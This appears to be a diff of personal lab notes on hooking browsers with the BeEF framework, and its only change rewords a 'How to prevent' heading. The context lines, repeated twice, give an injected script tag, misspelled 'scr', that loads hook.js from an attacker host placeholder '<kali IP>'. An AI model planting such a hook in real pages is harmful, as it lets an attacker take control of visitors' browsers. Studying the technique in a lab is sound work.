@@ -41,7 +41,7 @@ Add  <script scr="http://<kali IP>:3000/hook.js"></script> into the dialog box.
 You are now hooked by Beef.
 
 
--> How to prevent
+-> How to prevent yourself
 Here are some advice:
   -Nothing for now
 
@@ -97,7 +97,7 @@ Here are some advice:
 >@Add  <script scr="http://<kali IP>:3000/hook.js"></script> into the dialog box.
 >@You are now hooked by Beef.
 >@
->@-> How to prevent
+>@-> How to prevent yourself
 >@Nothing for now (in progress).
 >@
 >@##################################################################################################################################
